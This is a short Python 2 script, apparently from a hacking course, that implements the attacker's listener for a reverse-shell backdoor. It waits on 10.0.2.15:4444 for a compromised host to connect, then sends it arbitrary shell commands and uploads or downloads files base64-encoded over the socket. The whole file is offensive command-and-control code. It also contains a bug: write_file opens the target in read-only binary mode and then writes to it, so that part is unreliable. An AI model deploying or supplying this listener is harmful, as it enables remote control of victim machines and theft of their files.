#!/usr/bin/env python
import base64
import socket
import json


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        #  py3 self.connection.send(json_data.encode())
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "rb") as file_down:
            file_down.write(base64.b64decode(content))
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file_down:
            return base64.b64encode(file_down.read())

    def run(self):
        while True:
            # py3 command = input(">> ")
            command = raw_input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                elif command[0] == "cd" and len(command) > 2:
                    command[1] = " ".join(command[1:])
                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Errors " not in result:
                    result = self.write_file(command[1], result)
            except Exception as e:
                result = "[-] Errors during command execution."

            print(result)


my_listener = Listener("10.0.2.15", 4444)
my_listener.run()
